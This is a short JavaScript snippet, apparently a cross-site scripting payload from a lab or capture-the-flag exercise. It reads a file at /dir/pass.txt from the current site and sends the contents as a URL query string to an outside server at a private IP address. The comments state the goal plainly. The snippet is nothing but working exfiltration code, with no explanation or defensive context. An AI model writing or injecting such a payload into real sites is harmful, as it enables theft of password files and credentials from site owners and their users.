// Fetch the contents of /dir/pass.txt
fetch('/dir/pass.txt')
  .then(response => {
    return response.text();
  })
  .then(data => {
    // Send the contents to another web server
    const targetURL = 'http://10.14.47.209/thisistheshit?=' + data;
    // Perform a GET request to the other web server
    fetch(targetURL)
      .then(response => {
        return response.text();
      })
  })